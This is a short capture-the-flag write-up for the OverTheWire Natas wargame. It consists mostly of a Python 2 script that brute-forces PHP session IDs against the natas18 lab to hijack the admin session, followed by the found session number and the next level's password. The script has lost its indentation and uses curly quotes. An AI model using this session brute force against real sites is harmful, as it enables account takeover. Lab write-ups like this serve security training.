# natas19

```python
import httplib,sys
from base64 import b64encode

def check(sessid):
httpClient = None
try:
userAndPass = b64encode(b”natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP”).decode(“ascii”)
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas18.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?debug=a’, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
if ‘regular’ in responseData:
print ‘regular ‘+str(sessid)
else:
print responseData
sys.exit()
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

def autocheck():
for i in range(0,641):
check(i)

autocheck()
```

The admin sessid is at 138
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs